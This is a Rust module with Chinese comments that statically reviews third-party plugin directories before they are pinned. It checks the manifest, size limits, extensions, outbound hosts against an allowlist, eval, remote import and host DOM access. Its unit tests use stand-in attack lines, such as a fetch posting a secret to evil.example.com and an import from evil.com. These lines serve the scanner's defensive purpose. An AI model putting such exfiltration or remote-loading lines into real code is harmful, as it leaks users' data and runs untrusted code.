//! 插件审核关（用户 2026-10-02 拍板的准入模型）—— **静态审查 + 放行绑定指纹**。
//!
//! 诉求：插件权限要放开（功能类插件化），但准入不能松。模型 =「应用商店审核」：
//! - **第三方插件（origin=user）必须过审才能 pin**：pin 是加载的前置条件（见 trust.rs），
//!   所以 pin 前跑一遍审核，有 blocker 直接拒 pin——审核不过 → 装不进来 → 跑不起来；
//! - **pin 即审核绑定**：pin 表记的是内容指纹（digest），内容一变 → 验签打回重审
//!   （trust::state 的 Changed），不存在「审旧跑新」；
//! - **内置插件（built_in）与模型自产 draft 不审**：前者位置即信任，后者权限本就清空；
//! - 审核的诚实边界：挡得住「来路不明 / 不合规范 / 要外联」，挡不死「审过之后运行时
//!   使坏」——后者靠指纹（跑的必须是审过的那份）+ 用户自觉兜底。
//!
//! 检查项（rule 号即代码里的常量；severity 两档：blocker 拒收 / warn 放行但亮旗）：
//! 1. `manifest.json` 可读且是合法 JSON、apiVersion 受支持（契约 check_api_version）；
//! 2. entry / settings_entry 声明的文件真实存在；
//! 3. permissions 声明的权限都在宿主白名单里（白名单外宿主本来也不认，亮旗让人看到）；
//! 4. 体积上限（文件数 / 总字节）——防病态包；
//! 5. 扩展名白名单——白名单外一律 warn（要人眼过，比如 .exe/.bat）；
//! 6. **外联网络**：代码里的 http(s) 主机必须命中 manifest 的 `network` 白名单，
//!    否则 blocker（外联是数据外泄的唯一通道，这是整套审核的核心项）；白名单字段是
//!    契约「只增不删」纪律下的新字段（老清单没有 = 不允许任何外联）；
//! 7. 动态执行：`eval(` / `new Function` / 动态 `import(` 远程地址 → blocker（混淆通道）；
//! 8. 直连宿主 API：代码里 fetch/XHR 打 `/api/...` → warn（正道是 postMessage 桥，
//!    桥有权限门；sandbox 不透明源下这种调用本来也会被浏览器拦，亮旗是让审的人看见意图）；
//! 9. 碰宿主 DOM/storage：`parent.document` / `localStorage` 等 → warn（不透明源下无效，
//!    但出现即说明作者没读懂隔离模型，值得人眼过）。

use std::path::{Path, PathBuf};

use serde::Serialize;

use crate::plugin::contract;
use crate::plugin::trust;

/// 文件数上限（插件不该是大杂烩目录）。
const MAX_FILES: usize = 200;
/// 总字节上限（8MB：够放演示素材，不够藏东西）。
const MAX_BYTES: u64 = 8 * 1024 * 1024;
/// 单文件字节上限（1MB：防单文件塞二进制）。
const MAX_FILE_BYTES: u64 = 1024 * 1024;
/// 行超长视为「压缩/混淆」信号的阈值。
const MINIFIED_LINE: usize = 2_000;

/// 允许的扩展名（插件 = 静态前端 + 可能的 wasm 工具）。白名单外 → warn。
const EXT_OK: &[&str] = &[
    "html", "htm", "js", "mjs", "css", "svg", "json", "md", "txt", "png", "jpg", "jpeg", "ico", "webp", "wat", "wasm",
];

/// 做代码模式扫描的扩展名（文本类；png/wasm 等二进制不扫）。
const TEXT_EXTS: &[&str] = &["html", "htm", "js", "mjs", "css", "svg"];

/// 宿主认可的权限白名单（与 ui::load_one 同表；声明表外 = 亮旗）。
const PERMS_OK: &[&str] = &[
    "composer.insert",
    "workspace.write",
    "bus.publish",
    "notify",
    "storage",
    "usage.prices",
    "clipboard",
    // 权限放开轮（用户拍板）新增：功能类插件改自己的功能设置 + 触发真动作
    "settings.feature",
    "action.run",
];

/// 审核结论。blocker 出现任意一条 → Blocked（pin 会被后端拒绝）。
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "snake_case")]
pub enum Verdict {
    Pass,
    Blocked,
}

/// 一条发现。
#[derive(Debug, Clone, Serialize)]
pub struct Finding {
    /// 规则号（稳定字符串，前端与文案都按它引用）。
    pub rule: &'static str,
    pub severity: Severity,
    pub file: String,
    /// 1 起始；无行号的发现为 None。
    pub line: Option<usize>,
    pub message: String,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "snake_case")]
pub enum Severity {
    Blocker,
    Warn,
}

/// 一份审核报告（含 digest：pin 时核对的正是这份内容）。
#[derive(Debug, Clone, Serialize)]
pub struct Report {
    pub verdict: Verdict,
    pub findings: Vec<Finding>,
    pub files_scanned: usize,
    pub bytes_scanned: u64,
    pub digest: Option<String>,
}

/// manifest 的 `network` 白名单（契约只增不删：老清单没这字段 = 不许任何外联）。
/// 条目 = 主机名（精确匹配）或 `*.example.com`（含子域）。
fn network_allowlist(manifest: &serde_json::Value) -> Vec<String> {
    manifest
        .get("network")
        .and_then(serde_json::Value::as_array)
        .map(|a| a.iter().filter_map(serde_json::Value::as_str).map(str::to_string).collect())
        .unwrap_or_default()
}

fn host_allowed(host: &str, allow: &[String]) -> bool {
    allow.iter().any(|a| {
        if let Some(suffix) = a.strip_prefix("*.") {
            host == suffix || host.ends_with(&format!(".{suffix}"))
        } else {
            host == a
        }
    })
}

/// 从一行文本里抓 http(s) 主机（返回 (host, 该行出现次数)）。
/// 只认显式协议头（协议相对的 `//host` 不抓：注释与字符串里的 `//` 噪声太大，
/// 而真实外联几乎总会写全协议）。
fn hosts_in_line(line: &str) -> Vec<String> {
    let mut out = Vec::new();
    for scheme in ["https://", "http://"] {
        let mut rest = line;
        while let Some(i) = rest.find(scheme) {
            let after = &rest[i + scheme.len()..];
            let end = after
                .find(|c: char| {
                    c.is_whitespace() || matches!(c, '"' | '\'' | '`' | '<' | '>' | ')' | '(' | ']' | '[' | ';' | ',')
                })
                .unwrap_or(after.len());
            let host: String = after[..end]
                .chars()
                .take_while(|c| ! matches!(c, '/' | '?' | '#' | ':'))
                .collect();
            if !host.is_empty() {
                out.push(host);
            }
            rest = &after[end..];
        }
    }
    out
}

/// 一行里是否出现某子串（大小写不敏感，抓混淆过的大小写变形）。
fn has_ci(haystack: &str, needle: &str) -> bool {
    haystack.to_ascii_lowercase().contains(&needle.to_ascii_lowercase())
}

/// 收集目录内全部文件（相对路径排序，与 digest 同遍历口径的浅层版：
/// 这里只走一层 read_dir + 受限递归，深树按 size 检查拦）。
fn collect_files(dir: &Path, out: &mut Vec<(String, PathBuf)>, depth: usize) -> Result<(), String> {
    if depth > 4 {
        return Err("目录层级过深（插件不该有深层嵌套）".into());
    }
    let rd = std::fs::read_dir(dir).map_err(|e| format!("读目录 {} 失败: {e}", dir.display()))?;
    for e in rd.flatten() {
        let p = e.path();
        let Ok(ft) = e.file_type() else { continue };
        if ft.is_dir() {
            collect_files(&p, out, depth + 1)?;
        } else if ft.is_file() {
            let rel = p.strip_prefix(dir).unwrap_or(&p).to_string_lossy().replace('\\', "/");
            out.push((rel, p));
        }
    }
    Ok(())
}

/// 审核一个插件目录（key 只用于错误信息；调用方负责 resolve）。
pub fn review_dir(dir: &Path) -> Report {
    let mut findings: Vec<Finding> = Vec::new();
    let blocker = |rule: &'static str, message: String| Finding {
        rule,
        severity: Severity::Blocker,
        file: ".".into(),
        line: None,
        message,
    };
    let warn = |rule: &'static str, message: String| Finding {
        rule,
        severity: Severity::Warn,
        file: ".".into(),
        line: None,
        message,
    };

    let mut files: Vec<(String, PathBuf)> = Vec::new();
    if let Err(e) = collect_files(dir, &mut files, 0) {
        findings.push(blocker("review.dir_unreadable", e));
        return finish(findings, 0, 0, None);
    }
    files.sort_by(|a, b| a.0.cmp(&b.0));

    let total_bytes: u64 = files.iter().map(|(_, p)| std::fs::metadata(p).map(|m| m.len()).unwrap_or(0)).sum();
    let files_scanned = files.len();
    if files_scanned > MAX_FILES {
        findings.push(blocker(
            "review.size_files",
            format!("文件数 {files_scanned} 超过上限 {MAX_FILES}（插件不该是大杂烩目录）"),
        ));
    }
    if total_bytes > MAX_BYTES {
        findings.push(blocker(
            "review.size_bytes",
            format!("总大小 {} 字节超过上限 {MAX_BYTES}", total_bytes),
        ));
    }

    // —— manifest 检查 ——
    let manifest_text = files
        .iter()
        .find(|(rel, _)| rel == "manifest.json")
        .and_then(|(_, p)| std::fs::read_to_string(p).ok());
    let manifest: Option<serde_json::Value> = match &manifest_text {
        None => {
            findings.push(blocker("review.manifest_missing", "manifest.json 缺失或读不出来".into()));
            None
        }
        Some(t) => match serde_json::from_str(t) {
            Ok(v) => Some(v),
            Err(e) => {
                findings.push(blocker("review.manifest_json", format!("manifest.json 不是合法 JSON: {e}")));
                None
            }
        },
    };
    let allow = manifest.as_ref().map(network_allowlist).unwrap_or_default();
    if let Some(m) = &manifest {
        if let Err(e) = contract::check_api_version(m) {
            findings.push(blocker("review.manifest_apiversion", e));
        }
        // entry / settings_entry 声明的文件必须真实存在
        for field in ["entry", "settings_entry"] {
            if let Some(rel) = m.get(field).and_then(serde_json::Value::as_str) {
                let rel_norm = rel.replace('\\', "/");
                if !files.iter().any(|(r, _)| r == &rel_norm) {
                    findings.push(blocker(
                        "review.manifest_entry_missing",
                        format!("声明的 {field} {rel} 在插件目录里不存在"),
                    ));
                }
            }
        }
        // permissions 声明核对宿主白名单
        if let Some(perms) = m.get("permissions").and_then(serde_json::Value::as_array) {
            for p in perms.iter().filter_map(serde_json::Value::as_str) {
                if !PERMS_OK.contains(&p) {
                    findings.push(warn(
                        "review.permission_unknown",
                        format!("声明了宿主不认可的权限 {p}（宿主会忽略它；确认作者没写错）"),
                    ));
                }
            }
        }
    }

    // —— 逐文件内容扫描 ——
    for (rel, p) in &files {
        let ext = p.extension().and_then(|e| e.to_str()).unwrap_or("").to_ascii_lowercase();
        if !EXT_OK.contains(&ext.as_str()) {
            findings.push(Finding {
                rule: "review.extension_unknown",
                severity: Severity::Warn,
                file: rel.clone(),
                line: None,
                message: format!("扩展名 .{ext} 不在白名单（静态前端插件不该有这种文件，需人眼过）"),
            });
        }
        let Ok(meta) = std::fs::metadata(p) else { continue };
        if meta.len() > MAX_FILE_BYTES {
            findings.push(Finding {
                rule: "review.file_too_big",
                severity: Severity::Warn,
                file: rel.clone(),
                line: None,
                message: format!("单文件 {} 字节超过 {MAX_FILE_BYTES}", meta.len()),
            });
        }
        if !TEXT_EXTS.contains(&ext.as_str()) {
            continue;
        }
        let Ok(text) = std::fs::read_to_string(p) else { continue };
        for (idx, line) in text.lines().enumerate() {
            let ln = idx + 1;
            let at = |rule: &'static str, severity: Severity, message: String| Finding {
                rule,
                severity,
                file: rel.clone(),
                line: Some(ln),
                message,
            };
            // 外联网络（核心项）
            for host in hosts_in_line(line) {
                if !host_allowed(&host, &allow) {
                    findings.push(at(
                        "review.network_external",
                        Severity::Blocker,
                        format!("代码要访问外部主机 {host}，但 manifest 的 network 白名单没批它"),
                    ));
                }
            }
            // 动态执行
            if has_ci(line, "eval(") || has_ci(line, "new function") {
                findings.push(at(
                    "review.dynamic_exec",
                    Severity::Blocker,
                    "出现 eval(/new Function 动态执行（混淆通道，审核不放行）".into(),
                ));
            }
            if has_ci(line, "import(") {
                // 动态 import 远程地址 = 加载外部代码；其余动态 import 只亮旗
                let remote = hosts_in_line(line);
                if !remote.is_empty() && !remote.iter().all(|h| host_allowed(h, &allow)) {
                    findings.push(at(
                        "review.dynamic_import_remote",
                        Severity::Blocker,
                        "动态 import() 加载未授权的外部代码".into(),
                    ));
                } else {
                    findings.push(at(
                        "review.dynamic_import",
                        Severity::Warn,
                        "出现动态 import()（确认加载的是插件自己的文件）".into(),
                    ));
                }
            }
            // 直连宿主 API（正道是 postMessage 桥）
            if (has_ci(line, "fetch(") || has_ci(line, "xmlhttprequest") || has_ci(line, ".sendbeacon"))
                && line.contains("/api/")
            {
                findings.push(at(
                    "review.host_api_direct",
                    Severity::Warn,
                    "代码直接打宿主的 /api/ 接口（正道是 postMessage 桥，桥有权限门；不透明源下这也调不通）".into(),
                ));
            }
            // 碰宿主 DOM / storage
            if has_ci(line, "parent.document") || has_ci(line, "top.document") || has_ci(line, "window.parent")
                || has_ci(line, "localstorage") || has_ci(line, "sessionstorage") || has_ci(line, "document.cookie")
            {
                findings.push(at(
                    "review.host_dom_touch",
                    Severity::Warn,
                    "代码试图碰宿主 DOM/storage（sandbox 不透明源下无效，但说明作者没读懂隔离模型）".into(),
                ));
            }
            // 压缩/混淆信号
            if line.len() > MINIFIED_LINE {
                findings.push(at(
                    "review.minified_code",
                    Severity::Warn,
                    format!("存在 {MINIFIED_LINE}+ 字符的超长行（疑似压缩/混淆代码，需人眼过）"),
                ));
            }
        }
    }

    finish(findings, files_scanned, total_bytes, None)
}

fn finish(findings: Vec<Finding>, files_scanned: usize, bytes_scanned: u64, digest: Option<String>) -> Report {
    let verdict = if findings.iter().any(|f| f.severity == Severity::Blocker) {
        Verdict::Blocked
    } else {
        Verdict::Pass
    };
    Report { verdict, findings, files_scanned, bytes_scanned, digest }
}

/// 按 pin 键审核（resolve 出目录；找不到 = 明确报错，不静默放行）。
pub fn review_key(key: &str) -> Result<Report, String> {
    let path = trust::resolve(key).ok_or_else(|| format!("找不到插件 {key}（目录不存在或名字非法）"))?;
    if !path.is_dir() {
        return Err(format!("{key} 不是目录形态（裸文件插件不审：那是旧 WASM 形态）"));
    }
    let digest = trust::digest_of_path(&path)?;
    let mut r = review_dir(&path);
    r.digest = Some(digest);
    Ok(r)
}

/// 拒收理由（人话，pin 端点直接回给界面）。
pub fn block_reasons(report: &Report) -> Vec<String> {
    report
        .findings
        .iter()
        .filter(|f| f.severity == Severity::Blocker)
        .map(|f| match f.line {
            Some(l) => format!("[{}] {}:{} — {}", f.rule, f.file, l, f.message),
            None => format!("[{}] {} — {}", f.rule, f.file, f.message),
        })
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    fn tmp(tag: &str) -> PathBuf {
        let d = std::env::temp_dir().join(format!("agent-review-{tag}-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&d);
        std::fs::create_dir_all(&d).unwrap();
        d
    }

    fn plugin(tag: &str, manifest: &str, files: &[(&str, &str)]) -> PathBuf {
        let d = tmp(tag);
        std::fs::write(d.join("manifest.json"), manifest).unwrap();
        for (name, content) in files {
            let p = d.join(name);
            if let Some(parent) = p.parent() {
                std::fs::create_dir_all(parent).unwrap();
            }
            std::fs::write(p, content).unwrap();
        }
        d
    }

    fn clean_manifest() -> &'static str {
        r#"{"apiVersion":1,"title":"演示","entry":"index.html","permissions":["storage","settings.feature"]}"#
    }

    #[test]
    fn clean_plugin_passes_with_no_findings() {
        let d = plugin(
            "clean",
            clean_manifest(),
            &[("index.html", "<html><body><script>console.log('hi')</script></body></html>")],
        );
        let r = review_dir(&d);
        assert_eq!(r.verdict, Verdict::Pass, "{:?}", r.findings);
        assert!(r.findings.is_empty());
        let _ = std::fs::remove_dir_all(&d);
    }

    #[test]
    fn external_fetch_without_allowlist_is_blocker() {
        let d = plugin(
            "exfil",
            clean_manifest(),
            &[("app.js", "fetch('https://evil.example.com/steal', {method:'POST', body:secret})")],
        );
        let r = review_dir(&d);
        assert_eq!(r.verdict, Verdict::Blocked);
        assert!(r.findings.iter().any(|f| f.rule == "review.network_external"));
        let _ = std::fs::remove_dir_all(&d);
    }

    #[test]
    fn allowlisted_host_passes_others_blocked() {
        let m = r#"{"apiVersion":1,"title":"演示","entry":"index.html","network":["cdn.jsdelivr.net","*.trusted.dev"]}"#;
        let d = plugin(
            "allow",
            m,
            &[(
                "app.js",
                "fetch('https://cdn.jsdelivr.net/lib.js'); fetch('https://api.trusted.dev/x'); fetch('https://nope.com/y')",
            )],
        );
        let r = review_dir(&d);
        assert_eq!(r.verdict, Verdict::Blocked, "未授权的 nope.com 必须拦");
        let blocked: Vec<_> = r
            .findings
            .iter()
            .filter(|f| f.rule == "review.network_external")
            .map(|f| f.message.clone())
            .collect();
        assert_eq!(blocked.len(), 1, "只该拦 nope.com: {blocked:?}");
        assert!(blocked[0].contains("nope.com"));
        let _ = std::fs::remove_dir_all(&d);
    }

    #[test]
    fn eval_and_remote_import_are_blockers() {
        let d = plugin(
            "dyn",
            clean_manifest(),
            &[("a.js", "eval(userInput); new Function('x','return x')(1)"), ("b.js", "import('https://evil.com/x.js')")],
        );
        let r = review_dir(&d);
        assert_eq!(r.verdict, Verdict::Blocked);
        assert!(r.findings.iter().any(|f| f.rule == "review.dynamic_exec"));
        assert!(r.findings.iter().any(|f| f.rule == "review.dynamic_import_remote"));
        let _ = std::fs::remove_dir_all(&d);
    }

    #[test]
    fn broken_manifest_is_blocker() {
        let d = plugin("badman", "{ not json", &[("index.html", "x")]);
        let r = review_dir(&d);
        assert_eq!(r.verdict, Verdict::Blocked);
        assert!(r.findings.iter().any(|f| f.rule == "review.manifest_json"));

        let d2 = plugin("noversion", r#"{"apiVersion":2,"entry":"index.html"}"#, &[("index.html", "x")]);
        let r2 = review_dir(&d2);
        assert_eq!(r2.verdict, Verdict::Blocked);
        assert!(r2.findings.iter().any(|f| f.rule == "review.manifest_apiversion"));

        let d3 = plugin("noentry", r#"{"apiVersion":1,"entry":"missing.html"}"#, &[("index.html", "x")]);
        let r3 = review_dir(&d3);
        assert_eq!(r3.verdict, Verdict::Blocked);
        assert!(r3.findings.iter().any(|f| f.rule == "review.manifest_entry_missing"));
        let _ = std::fs::remove_dir_all(&d);
        let _ = std::fs::remove_dir_all(&d2);
        let _ = std::fs::remove_dir_all(&d3);
    }

    #[test]
    fn host_dom_touch_and_unknown_ext_are_warns_only() {
        let d = plugin(
            "warn",
            clean_manifest(),
            &[("index.html", "<script>parent.document.title='x'</script>"), ("evil.exe", "MZ...")],
        );
        let r = review_dir(&d);
        assert_eq!(r.verdict, Verdict::Pass, "warn 不该拦: {:?}", r.findings);
        assert!(r.findings.iter().any(|f| f.rule == "review.host_dom_touch"));
        assert!(r.findings.iter().any(|f| f.rule == "review.extension_unknown"));
        let _ = std::fs::remove_dir_all(&d);
    }

    #[test]
    fn unknown_permission_warns_and_line_numbers_present() {
        let d = plugin(
            "perm",
            r#"{"apiVersion":1,"entry":"index.html","permissions":["world.domination"]}"#,
            &[("index.html", "<html></html>"), ("a.js", "line1\nline2 fetch('/api/settings')\nline3")],
        );
        let r = review_dir(&d);
        assert_eq!(r.verdict, Verdict::Pass);
        assert!(r.findings.iter().any(|f| f.rule == "review.permission_unknown"));
        let direct = r.findings.iter().find(|f| f.rule == "review.host_api_direct").unwrap();
        assert_eq!(direct.line, Some(2), "行号必须指到真正出事那行");
        let _ = std::fs::remove_dir_all(&d);
    }

    #[test]
    fn block_reasons_are_human_readable() {
        let d = plugin("reason", clean_manifest(), &[("index.html", "<html></html>"), ("app.js", "fetch('http://a.cn/x')")]);
        let r = review_dir(&d);
        let reasons = block_reasons(&r);
        assert_eq!(reasons.len(), 1);
        assert!(reasons[0].contains("app.js:1"), "{reasons:?}");
        assert!(reasons[0].contains("network_external"));
        let _ = std::fs::remove_dir_all(&d);
    }
}
